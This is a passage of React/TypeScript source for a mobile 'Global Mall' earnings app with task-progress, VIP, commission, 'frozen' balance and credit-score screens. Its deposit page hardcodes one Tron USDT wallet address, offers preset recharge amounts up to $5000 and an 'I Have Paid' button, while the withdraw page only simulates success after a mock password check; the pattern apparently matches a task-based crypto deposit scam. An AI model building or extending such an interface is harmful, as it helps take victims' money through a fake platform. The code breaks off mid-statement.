                    <div className="relative z-10">
                        <div className="w-8 h-8 rounded-full bg-green-500/20 flex items-center justify-center text-green-500">
                             <Award size={16} />
                        </div>
                    </div>
                     <div className="absolute -right-4 -top-4 w-16 h-16 bg-green-500/10 rounded-full blur-xl"></div>
                </div>

                {/* Total Deposit */}
                <div className="bg-gradient-to-br from-[#1a1a1a] to-[#111] p-4 rounded-xl border border-[#222] flex flex-col justify-between h-32 relative overflow-hidden">
                     <div className="relative z-10">
                        <span className="text-gray-400 text-[10px] uppercase font-bold tracking-wider">Total Deposit</span>
                        <h3 className="text-2xl font-bold text-white mt-1">$0.00</h3>
                    </div>
                    <div className="relative z-10">
                        <div className="w-8 h-8 rounded-full bg-purple-500/20 flex items-center justify-center text-purple-500">
                             <ArrowRight size={16} className="rotate-45" />
                        </div>
                    </div>
                     <div className="absolute -right-4 -top-4 w-16 h-16 bg-purple-500/10 rounded-full blur-xl"></div>
                </div>

                {/* Total Withdraw */}
                <div className="bg-gradient-to-br from-[#1a1a1a] to-[#111] p-4 rounded-xl border border-[#222] flex flex-col justify-between h-32 relative overflow-hidden">
                     <div className="relative z-10">
                        <span className="text-gray-400 text-[10px] uppercase font-bold tracking-wider">Total Withdraw</span>
                        <h3 className="text-2xl font-bold text-red-400 mt-1">$0.00</h3>
                    </div>
                     <div className="relative z-10">
                        <div className="w-8 h-8 rounded-full bg-red-500/20 flex items-center justify-center text-red-500">
                             <ArrowRight size={16} className="-rotate-45" />
                        </div>
                    </div>
                    <div className="absolute -right-4 -top-4 w-16 h-16 bg-red-500/10 rounded-full blur-xl"></div>
                </div>
            </div>

            {/* Task Status Bar */}
            <div className="bg-[#111] border border-[#222] rounded-xl p-4">
                 <div className="flex justify-between items-center mb-2">
                     <span className="text-white font-bold text-sm">Current Task Status</span>
                     <span className="text-yellow-500 font-bold text-xs">In Progress</span>
                 </div>
                 <div className="w-full bg-[#222] rounded-full h-2 mb-2">
                     <div className="bg-yellow-500 h-2 rounded-full" style={{ width: '50%' }}></div>
                 </div>
                 <div className="flex justify-between text-[10px] text-gray-500">
                     <span>Task 5</span>
                     <span>Target: 10</span>
                 </div>
            </div>
        </div>
    );
};

// 3. Deposit History View (Mine -> List -> Deposit Record)
const DepositHistoryView = ({ onBack }: { onBack: () => void }) => {
    // UPDATED: Empty for new user
    const deposits: any[] = [];

    return (
        <div className="pb-24 px-4 pt-4 bg-[#0a0a0a] min-h-screen">
            <Header title="Deposit History" onBack={onBack} />
            <div className="space-y-3">
                {deposits.length > 0 ? deposits.map(dep => (
                    <div key={dep.id} className="bg-[#111] border border-[#222] rounded-xl p-4 flex justify-between items-center">
                        <div className="flex items-center gap-3">
                             <div className="w-10 h-10 rounded-full bg-green-900/20 flex items-center justify-center text-green-500">
                                 <Wallet size={18} />
                             </div>
                             <div>
                                 <h4 className="text-white font-bold text-sm">USDT Recharge</h4>
                                 <p className="text-gray-500 text-[10px]">{dep.date}</p>
                             </div>
                        </div>
                        <div className="text-right">
                             <p className="text-green-500 font-bold text-sm">+{dep.amount}</p>
                             <p className={`text-[10px] ${dep.status === 'Success' ? 'text-green-500' : 'text-red-500'}`}>{dep.status}</p>
                        </div>
                    </div>
                )) : (
                    <div className="text-center py-20 text-gray-500 text-sm">No deposit history.</div>
                )}
            </div>
        </div>
    );
};

// 4. Withdraw History View (Mine -> List -> Withdraw Record)
const WithdrawHistoryView = ({ onBack }: { onBack: () => void }) => {
    // UPDATED: Empty for new user
    const withdraws: any[] = [];

    return (
        <div className="pb-24 px-4 pt-4 bg-[#0a0a0a] min-h-screen">
            <Header title="Withdraw History" onBack={onBack} />
             <div className="space-y-3">
                {withdraws.length > 0 ? withdraws.map(wd => (
                    <div key={wd.id} className="bg-[#111] border border-[#222] rounded-xl p-4 flex justify-between items-center">
                        <div className="flex items-center gap-3">
                             <div className="w-10 h-10 rounded-full bg-red-900/20 flex items-center justify-center text-red-500">
                                 <Wallet size={18} />
                             </div>
                             <div>
                                 <h4 className="text-white font-bold text-sm">USDT Withdraw</h4>
                                 <p className="text-gray-500 text-[10px]">{wd.date}</p>
                             </div>
                        </div>
                        <div className="text-right">
                             <p className="text-red-500 font-bold text-sm">-{wd.amount}</p>
                             <p className={`text-[10px] ${wd.status === 'Success' ? 'text-green-500' : 'text-yellow-500'}`}>{wd.status}</p>
                        </div>
                    </div>
                )) : (
                    <div className="text-center py-20 text-gray-500 text-sm">No withdrawal history.</div>
                )}
            </div>
        </div>
    );
};

// 5. Settings View (Read Only - No Password Changes)
const SettingsView = ({ onBack }: { onBack: () => void }) => {
    return (
        <div className="pb-24 px-4 pt-4 bg-[#0a0a0a] min-h-screen">
            <Header title="Settings" onBack={onBack} />
            
            <div className="space-y-3">
                <div className="bg-[#111] border border-[#222] rounded-xl p-4 flex items-center gap-4">
                    <Info className="text-blue-500" size={20} />
                    <div>
                        <h4 className="text-white font-bold text-sm">About Us</h4>
                        <p className="text-gray-500 text-xs">Global Mall Platform Information</p>
                    </div>
                    <ChevronRight className="ml-auto text-gray-600" size={16} />
                </div>
                
                <div className="bg-[#111] border border-[#222] rounded-xl p-4 flex items-center gap-4">
                    <ShieldCheck className="text-green-500" size={20} />
                    <div>
                        <h4 className="text-white font-bold text-sm">Rules & Regulations</h4>
                        <p className="text-gray-500 text-xs">Platform usage guidelines</p>
                    </div>
                    <ChevronRight className="ml-auto text-gray-600" size={16} />
                </div>

                 <div className="bg-[#111] border border-[#222] rounded-xl p-4 flex items-center gap-4">
                    <HelpCircle className="text-yellow-500" size={20} />
                    <div>
                        <h4 className="text-white font-bold text-sm">Help Center</h4>
                        <p className="text-gray-500 text-xs">FAQ and Support</p>
                    </div>
                    <ChevronRight className="ml-auto text-gray-600" size={16} />
                </div>

                <div className="mt-8 text-center">
                    <p className="text-gray-600 text-xs">Version 1.0.2</p>
                </div>
            </div>
        </div>
    );
};

const ProfileDetailsView = ({ onBack, onLogout }: { onBack: () => void, onLogout: () => void }) => {
    // Mock Data mimicking a real user profile fetch
    // UPDATED: Zero balances for new user
    const userProfile = {
        username: "USER99",
        id: "883742",
        vipLevel: "VIP 0",
        avatar: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=200&q=80", 
        realName: "Alex ******",
        phone: "+44 7*** ***77",
        balance: 0.00,
        commission: 0.00,
        frozen: 0.00, 
        totalOrders: 0,
        pendingOrders: 0,
        creditScore: 100
    };

    return (
        <div className="pb-24 px-4 pt-4 bg-[#0a0a0a] min-h-screen animate-in fade-in slide-in-from-right duration-300">
            <Header title="Personal Information" onBack={onBack} />

            <div className="space-y-6">
                {/* Identity Card */}
                <div className="bg-[#111] border border-[#222] rounded-2xl p-6 flex flex-col items-center relative overflow-hidden">
                    <div className="w-24 h-24 rounded-full border-4 border-[#222] p-1 mb-3 relative z-10">
                        <img src={userProfile.avatar} alt="Profile" className="w-full h-full rounded-full object-cover" />
                        <div className="absolute bottom-1 right-1 w-6 h-6 bg-green-500 border-2 border-[#111] rounded-full flex items-center justify-center">
                            <Check size={12} className="text-white" />
                        </div>
                    </div>
                    <h2 className="text-2xl font-bold text-white z-10">{userProfile.username}</h2>
                    <p className="text-gray-500 text-sm mb-2 z-10">ID: {userProfile.id}</p>
                    <span className="px-3 py-1 bg-gradient-to-r from-red-600 to-orange-600 rounded-full text-white text-xs font-bold z-10">
                        {userProfile.vipLevel} Member
                    </span>
                    
                    {/* Background decoration */}
                    <div className="absolute top-0 left-0 w-full h-24 bg-gradient-to-b from-red-900/20 to-transparent"></div>
                </div>

                {/* Financial Summary */}
                <div className="bg-[#111] border border-[#222] rounded-xl p-4">
                    <h3 className="text-white font-bold text-sm mb-4 flex items-center gap-2">
                        <Wallet size={18} className="text-red-500" />
                        Asset Details
                    </h3>
                    <div className="grid grid-cols-3 gap-2 text-center divide-x divide-[#222]">
                        <div>
                            <p className="text-[10px] text-gray-500 uppercase">Balance</p>
                            <p className="text-white font-bold text-sm">${userProfile.balance.toFixed(2)}</p>
                        </div>
                        <div>
                            <p className="text-[10px] text-gray-500 uppercase">Commission</p>
                            <p className="text-green-500 font-bold text-sm">+${userProfile.commission.toFixed(2)}</p>
                        </div>
                         <div>
                            <p className="text-[10px] text-gray-500 uppercase">Frozen</p>
                            <p className="text-red-500 font-bold text-sm">${userProfile.frozen.toFixed(2)}</p>
                        </div>
                    </div>
                </div>

                {/* Work History Stats */}
                 <div className="bg-[#111] border border-[#222] rounded-xl p-4">
                    <h3 className="text-white font-bold text-sm mb-4 flex items-center gap-2">
                        <Briefcase size={18} className="text-blue-500" />
                        Work History
                    </h3>
                    <div className="space-y-3">
                        <div className="flex justify-between items-center pb-2 border-b border-[#222]">
                            <span className="text-gray-400 text-xs">Total Orders Completed</span>
                            <span className="text-white font-bold">{userProfile.totalOrders}</span>
                        </div>
                        <div className="flex justify-between items-center pb-2 border-b border-[#222]">
                            <span className="text-gray-400 text-xs">Pending Tasks</span>
                            <span className="text-yellow-500 font-bold">{userProfile.pendingOrders}</span>
                        </div>
                        <div className="flex justify-between items-center">
                            <span className="text-gray-400 text-xs">Credit Score</span>
                            <span className="text-white font-bold flex items-center gap-1">
                                {userProfile.creditScore} 
                                <ShieldCheck size={12} className="text-green-500" />
                            </span>
                        </div>
                    </div>
                </div>

                {/* Personal Details List */}
                <div className="bg-[#111] border border-[#222] rounded-xl overflow-hidden">
                     <div className="p-4 border-b border-[#222] flex justify-between items-center">
                         <span className="text-gray-400 text-sm">Real Name</span>
                         <span className="text-white font-medium text-sm">{userProfile.realName}</span>
                     </div>
                     <div className="p-4 border-b border-[#222] flex justify-between items-center">
                         <span className="text-gray-400 text-sm">Phone Number</span>
                         <span className="text-white font-medium text-sm">{userProfile.phone}</span>
                     </div>
                     <div className="p-4 border-b border-[#222] flex justify-between items-center">
                         <span className="text-gray-400 text-sm">Login Password</span>
                         <span className="text-gray-500 text-sm">********</span>
                     </div>
                     <div className="p-4 flex justify-between items-center">
                         <span className="text-gray-400 text-sm">Withdrawal Password</span>
                         <span className="text-gray-500 text-sm">******</span>
                     </div>
                </div>

                {/* Logout Button */}
                <button 
                    onClick={onLogout}
                    className="w-full py-4 border border-red-900/50 bg-red-900/10 text-red-500 font-bold rounded-xl flex items-center justify-center gap-2 hover:bg-red-900/20 active:scale-95 transition-all"
                >
                    <LogOut size={20} />
                    Log Out
                </button>

                <p className="text-center text-[10px] text-gray-600 pt-4">
                    Data is encrypted and secured.
                </p>
            </div>
        </div>
    );
};

const DepositView = ({ onBack }: { onBack: () => void }) => {
  const [copied, setCopied] = useState(false);
  const address = "TVG7Dunhtjw2g4wPgcEDvhRykoUFiSRKb2"; // User provided address

  const handleCopy = () => {
    navigator.clipboard.writeText(address);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="pb-24 px-4 pt-4 bg-[#0a0a0a] min-h-screen">
      <Header title="Deposit USDT" onBack={onBack} />
      
      <div className="flex flex-col items-center">
         {/* QR Code Section */}
         <div className="mt-4 mb-8 relative">
             <div className="bg-white p-3 rounded-xl">
                 <img 
                    src={`https://api.qrserver.com/v1/create-qr-code/?size=180x180&data=${address}`}
                    alt="Deposit QR" 
                    className="w-48 h-48" 
                 />
             </div>
             {/* Logo Center Overlay */}
             <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-10 h-10 bg-[#26a17b] rounded-full flex items-center justify-center border-4 border-white">
                 <span className="text-white font-bold text-xs">T</span>
             </div>
         </div>

         {/* Network / Wallet Name Section */}
         <div className="w-full mb-6">
            <p className="text-gray-500 text-sm mb-2">Network</p>
            <div className="bg-[#111] rounded-xl p-4 border border-[#222] flex justify-between items-center">
                <div>
                    <h3 className="text-white font-bold text-lg">TRX</h3>
                    <p className="text-gray-500 text-xs">Tron (TRC20)</p>
                </div>
                {/* Simulated Exchange Icon */}
                <div className="w-8 h-8 bg-[#222] rounded-full flex items-center justify-center text-gray-400">
                    <ArrowLeftRight size={16} className="rotate-90" /> 
                </div>
            </div>
         </div>

         {/* Address Section */}
         <div className="w-full mb-8">
            <p className="text-gray-500 text-sm mb-2">Deposit Address</p>
            <div className="bg-[#111] rounded-xl p-4 border border-[#222] flex justify-between items-center gap-3">
                <p className="text-white font-mono text-sm break-all font-medium flex-1">{address}</p>
                <button 
                    onClick={handleCopy}
                    className="p-2 bg-[#222] rounded-lg text-white hover:bg-[#333] transition-colors flex-shrink-0"
                >
                    {copied ? <CheckCircle2 size={20} className="text-green-500" /> : <Copy size={20} />}
                </button>
            </div>
         </div>
         
         {/* Save Button (Yellow as in screenshot) */}
         <button className="w-full py-4 bg-[#fcd535] hover:bg-[#eec824] text-black font-bold rounded-xl shadow-lg transition-colors mb-6">
            Save and Share Address
         </button>
         
         {/* Keeping the amount selection as it was part of the app functionality, but styling it to fit better or pushing it down */}
         <div className="w-full border-t border-[#222] pt-6">
            <p className="text-gray-500 text-sm mb-4">Select Recharge Amount</p>
            <div className="grid grid-cols-3 gap-3 mb-6">
                {[100, 300, 500, 1000, 2000, 5000].map(amt => (
                    <button key={amt} className="py-3 rounded-xl border border-[#333] text-white font-medium hover:border-[#fcd535] hover:text-[#fcd535] transition-colors bg-[#111]">
                        ${amt}
                    </button>
                ))}
            </div>
            <button className="w-full py-4 bg-red-600 rounded-xl text-white font-bold hover:bg-red-700 active:scale-95 transition-all shadow-xl">
                I Have Paid
            </button>
         </div>

      </div>
    </div>
  );
};

const WithdrawView = ({ onBack }: { onBack: () => void }) => {
    const [amount, setAmount] = useState('');
    const [password, setPassword] = useState('');
    const [message, setMessage] = useState('');
    const [status, setStatus] = useState<'idle' | 'checking' | 'success' | 'error'>('idle');

    const handleWithdraw = () => {
        if (!amount || !password) {
            setMessage("Please fill all fields");
            setStatus('error');
            return;
        }

        setStatus('checking');
        setMessage('Checking withdrawal status...');

        setTimeout(() => {
            if (parseFloat(amount) < 10) {
                 setMessage("Minimum withdrawal is $10");
                 setStatus('error');
            } else if (password !== '123456') { // Mock password check
                 setMessage("Incorrect Security Password");
                 setStatus('error');
            } else {
                 setMessage("Withdrawal Successful!");
                 setStatus('success');
            }
        }, 1500);
    };

    return (
      <div className="pb-24 px-4 pt-4 bg-[#0a0a0a] min-h-screen">
        <Header title="Withdraw" onBack={onBack} />
        
        {message && (
            <div className={`mb-4 p-3 border rounded-lg flex items-center gap-2 text-sm ${status === 'success' ? 'bg-green-900/20 border-green-900/50 text-green-500' : 'bg-red-900/20 border-red-900/50 text-red-500'}`}>
                {status === 'success' ? <CheckCircle2 size={16} /> : <AlertCircle size={16} />} {message}
            </div>
        )}

        {/* Top Card - Identical Style to Deposit, using Wallet Logo */}
        <div className="bg-[#111] p-6 rounded-2xl border border-[#222] mb-6 flex flex-col items-center shadow-lg">
             <h3 className="text-white font-bold mb-4">Withdraw USDT (TRC20)</h3>
             <div className="w-32 h-32 rounded-full bg-red-900/20 flex items-center justify-center mb-4 border border-red-900/50 shadow-[0_0_20px_rgba(220,38,38,0.3)]">
                 <Wallet size={60} className="text-red-500" />
             </div>
             <p className="text-xs text-gray-500 mb-2 font-medium">My Balance</p>
             <p className="text-2xl font-bold text-white">0.00 USDT</p>
        </div>

        {/* Input Card */}
        <div className="bg-[#111] p-6 rounded-2xl border border-[#222] mb-6 shadow-lg space-y-6">
            
            <div className="bg-[#0a0a0a] p-4 rounded-xl border border-[#333] flex justify-between items-center">
                <span className="text-gray-400 text-sm">Network</span>
                <span className="text-red-500 font-bold font-mono">TRC20</span>
            </div>

            <div>
                <label className="text-xs text-gray-500 uppercase font-bold pl-1 mb-1 block">Withdrawal Amount</label>
                <div className="relative">
                    <input 
                        type="number" 
                        value={amount} 
                        onChange={e => setAmount(e.target.value)}
                        placeholder="Enter amount" 
                        className="w-full bg-[#0a0a0a] border border-[#333] rounded-xl p-4 text-white focus:border-red-600 outline-none pl-10 transition-colors" 
                    />
                    <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500">$</span>
                </div>
            </div>

            <div>
                <label className="text-xs text-gray-500 uppercase font-bold pl-1 mb-1 block">Security Password</label>
                <div className="relative">
                    <input 
                        type="password" 
                        value={password} 
                        onChange={e => setPassword(e.target.value)}
                        placeholder="Enter password" 
                        className="w-full bg-[#0a0a0a] border border-[#333] rounded-xl p-4 text-white focus:border-red-600 outline-none pl-10 transition-colors" 
                    />
                     <Lock size={16} className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-500" />
                </div>
            </div>

            <button 
                onClick={handleWithdraw} 
                disabled={status === 'checking'}
                className="w-full py-4 bg-red-600 rounded-xl text-white font-bold mt-4 hover:bg-red-700 active:scale-95 transition-all disabled:opacity-50 disabled:scale-100 shadow-xl"
            >
                {status === 'checking' ? 'Checking...' : 'Confirm Withdrawal'}
            </button>
        </div>
        
        <div className="text-center">
             <p className="text-xs text-gray-500">Withdrawals are processed automatically within 24 hours.</p>
        </div>
      </div>
    );
};

const WalletManagementView = ({ onBack }: { onBack: () => void }) => {
    const [walletName, setWalletName] = useState('');
    const [walletAddress, setWalletAddress] = useState('');
    const [amount, setAmount] = useState('');
    const [password, setPassword] = useState('');
    const [loading, setLoading] = useState(false);
    const [isBound, setIsBound] = useState(false);

    useEffect(() => {
        const savedData = localStorage.getItem('globalMallWallet');
        if (savedData) {
            const parsed = JSON.parse(savedData);
            setWalletName(parsed.walletName || '');
            setWalletAddress(parsed.walletAddress || '');
            setAmount(parsed.amount || '');
            setIsBound(true);
        }
    }, []);

    const handleSubmit = () => {
        if (isBound) return;
        
        if (!walletName || !walletAddress || !amount || !password) {
            // Simple validation
            alert("Please fill all fields");
            return;
        }
        setLoading(true);
        // Simulate network request
        setTimeout(() => {
            const data = { walletName, walletAddress, amount };
            localStorage.setItem('globalMallWallet', JSON.stringify